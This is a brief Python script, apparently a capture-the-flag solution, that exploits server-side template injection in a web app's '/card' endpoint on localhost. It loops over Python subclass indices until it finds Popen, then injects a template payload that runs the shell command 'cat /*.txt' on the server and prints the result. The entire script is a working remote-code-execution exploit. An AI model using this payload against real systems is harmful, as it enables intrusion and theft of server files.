import requests

for i in range(0,1000):
    data = f"''.__class__.mro()[1].__subclasses__()[{i}]"
    d = {"name": "{{"+data+"}}"}
    r = requests.post("http://localhost:8888/card",data=d)
    if "Popen" in r.text:
        print(r.text)
        print(i)
        break

d = {"name": "{{"+f"''.__class__.mro()[1].__subclasses__()[{i}]('cat /*.txt',shell=True,stdout=-1).communicate()[0].decode()"+"}}"}
r = requests.post("http://localhost:8888/card",data=d)
print(r.text)
